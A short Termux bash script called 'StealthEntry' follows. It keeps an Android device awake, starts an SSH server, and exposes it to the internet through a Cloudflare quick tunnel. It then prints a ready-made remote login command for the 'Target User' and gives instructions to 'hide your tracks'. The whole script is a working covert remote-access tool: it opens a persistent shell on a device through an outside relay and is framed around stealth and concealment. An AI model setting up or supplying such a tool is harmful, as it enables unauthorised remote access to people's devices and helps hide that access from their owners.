#!/bin/bash
# ====================================================
# Project:    StealthEntry v1.0 (Accurate Targeting)
# Repository: jakeloai/StealthEntry
# Developer:  Jake Lo
# Function:   Persistent Ingress & Secure Tunneling
# ====================================================

# 1. Engage Power Lock
termux-wake-lock
echo "[+] StealthEntry: Power lock engaged."

# 2. Start SSH Service
sshd
echo "[+] StealthEntry: SSHD active on port 8022."

# 3. Identify User
USER=$(whoami)

# 4. Initialize Cloudflare Quick Tunnel
echo "[*] StealthEntry: Initializing tunnel..."
T_LOG=".stealth_init.log"
nohup cloudflared tunnel --url ssh://localhost:8022 > $T_LOG 2>&1 &

# Loop to wait for the URL
URL=""
while [ -z "$URL" ]; do
    sleep 2
    URL=$(grep -o 'https://.*\.trycloudflare.com' $T_LOG | head -n 1)
done

# 5. Clear screen for the final "Photo-Op"
clear
echo "===================================================="
echo "                STEALTH ENTRY v1.0                  "
echo "                Developer: Jake Lo                  "
echo "===================================================="
echo ""
echo "Target User: $USER"
echo "Tunnel URL:  $URL"
echo ""
echo "--- REMOTE ACCESS COMMAND (Take a photo) ---"
echo ""
echo "ssh -o ServerAliveInterval=60 -o ProxyCommand='cloudflared access tcp --hostname %h' $USER@${URL#https://}"
echo ""
echo "----------------------------------------------------"
echo "If you need to completely stop the service and hide your tracks："
echo "1. pkill cloudflared"
echo "2. pkill sshd"
echo "3. exit (close tmux)"
echo "4. termux-wake-unlock"
echo "===================================================="

rm $T_LOG
